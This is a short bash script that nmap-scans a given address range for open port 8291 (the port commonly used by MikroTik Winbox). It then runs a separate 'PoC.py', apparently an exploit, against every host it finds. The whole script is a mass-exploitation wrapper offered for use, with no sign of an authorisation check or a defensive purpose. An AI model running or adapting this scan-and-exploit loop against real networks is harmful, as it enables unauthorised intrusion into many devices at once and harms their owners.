#!/bin/bash
nmap_path=`which nmap`
file_name=`echo $1 | awk -F "/" '{print $1}'`
echo 'Running nmap'
$nmap_path -T5 -sT -p 8291 --open $1 -oG - | awk '$4=="Ports:"{print $2}' | awk -F "/" '{print $1}' > tmp/output_`echo $1 | awk -F "/" '{print $1}'`.txt

 #file_content=`cat output_$file_name.txt`
 IFS=$'\r\n' GLOBIGNORE='*' command eval  'arr=($(cat tmp/output_$file_name.txt))'

echo 'Nmap finished'
for i in "${arr[@]}"
do
	python3 PoC.py $i
done

echo "Finish"
